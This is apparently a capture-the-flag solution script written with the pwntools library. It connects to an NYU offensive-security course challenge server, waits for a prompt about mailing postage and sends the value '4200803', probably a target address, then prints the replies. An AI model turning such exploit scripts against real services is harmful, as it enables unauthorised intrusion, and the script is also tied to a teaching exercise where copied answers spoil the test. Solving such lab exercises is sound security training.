from pwn import *

p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1247)

print(p.recvuntil(b"Can you tell me where to mail this postage?\n"))
p.send(bytes("4200803" + "\n", 'utf-8'))
print(p.recvline().decode('utf-8'))
print(p.recvline().decode('utf-8'))